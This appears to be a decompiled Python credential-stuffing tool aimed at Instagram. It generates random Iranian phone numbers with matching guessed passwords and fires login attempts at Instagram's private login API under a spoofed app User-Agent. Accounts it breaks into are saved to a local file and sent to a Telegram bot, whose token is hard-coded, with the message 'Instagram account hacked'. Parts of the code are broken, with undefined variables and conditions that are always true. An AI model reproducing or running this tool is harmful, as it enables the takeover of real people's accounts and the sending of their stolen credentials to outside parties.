# encoding: utf-8
# Decoded by HackerModePro tool...
# Copyright: PSH-TEAM
# Follow us on telegram ( @psh_team )
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()

try:
    import requests
except ImportError:
    os.system('pip install clear')
    import requests
    clear()
import os

import sys
import requests
os.system("clear")
B ='\033[1;92m'
A ='\033[1;91m'
import os,sys,subprocess
subprocess.getoutput("pip install requests")

    

import requests,sys,os,time
MSA = 'M1'
pss=input("\033[1;37m [~]\033[1;35m𝗘𝗻𝘁𝗲𝗿 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱 :\033[1;33m")

import webbrowser 
webbrowser.open("https://t.me/sq21c")

if pss ==MSA:
 pass
 print("\033[1;32m          𝗬𝗼𝘂 𝗮𝗿𝗲 𝗹𝗼𝗴𝗴𝗲𝗱 𝗶𝗻 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆")
 time.sleep(1)
 os.system('clear')
else:
 exit('\033[1;31m             𝘄𝗿𝗼𝗻𝗴 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱 ')
 


import pyfiglet


SSS = pyfiglet.figlet_format('M.S.A')
MMM = ('            𝐂𝐨𝐝𝐞 𝐁𝙮 : 𝐌.𝐒.𝐀 - @SQ21C')
print (SSS+MMM)

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg(2)
color4 = fg('9')    
B ='\033[1;92m'
bot = '1935527391:AAFX9h4-4a05PTP4CbYPCNi8uhg2oh3UQQIGB'  
print('_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-')
def close():
    input('- Press Enter To Exit /')
    sys.exit()
print("\n[?] 𝐂𝐎𝐃𝐄 𝐁𝐘 𝐌𝐒𝐀 : @𝐒𝐐21𝐂 𖠐 ")
print("= = = = = = = = = = = = = = = = = = = =")
h , b,s,block = 0,0,0,0
tele = input("[+]  𝚂𝙴𝙽𝙳 𝚃𝙾 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼?  Y/N : ")
print("= = = = = = = = = = = = = = = = = = = =")
if "Y" in tele:
    id = input("[+] 𝑬𝑵𝑻𝑬𝑹 𝑰𝑫 𖠎 : ")

    bot = input("[+] 𝐄𝐍𝐓𝐄𝐑 𝐓𝐎𝐊𝐄𝐍 𖠰 : ")

elif "y" in tele:
    id = input("[+] 𝑬𝑵𝑻𝑬𝑹 𝑰𝑫 𖠎 : ")
    bot = input("[+] 𝐄𝐍𝐓𝐄𝐑 𝐓𝐎𝐊𝐄𝐍 𖠰 : ")
print("= = = = = = = = = = = = = = = = = = = =")
ask = input("""[1] ᴇɴᴛᴇʀ ɴᴜᴍʙᴇʀ 1 ᴛᴏ sᴛᴀʀᴛ ᴄʜᴇᴄᴋ 
= = = = = = = = = = = = = =  = =
[+]𝐸𝑁𝑇𝐸𝑅 𝑁𝑈𝑀𝐵𝐸𝑅 1 : """)
if ask == "1":
   
    
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

        
while True:
        user = '1234567890'
        MSA = str("".join(random.choice(user)for i in range(7)))
        user= '+98912'+MSA
        pasw = '0912'+MSA
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐡𝐚𝐜𝐤𝐞𝐝 𝑩𝒀 𝑴𝑺𝑨 𖤐 \n====================\n[=] ᯓ 𝗨𝐬𝐞𝐫𝗡𝐚𝐦𝐞 »   : {user} \n[=] ᯓ 𝗽𝐚𝐬𝐬🆆𝐨𝐫𝐝 »   : {pasw}\n====================\n • Tele: @SQ21C 🔥✅𖤐")
            open("MSA.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\033[1;91m                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
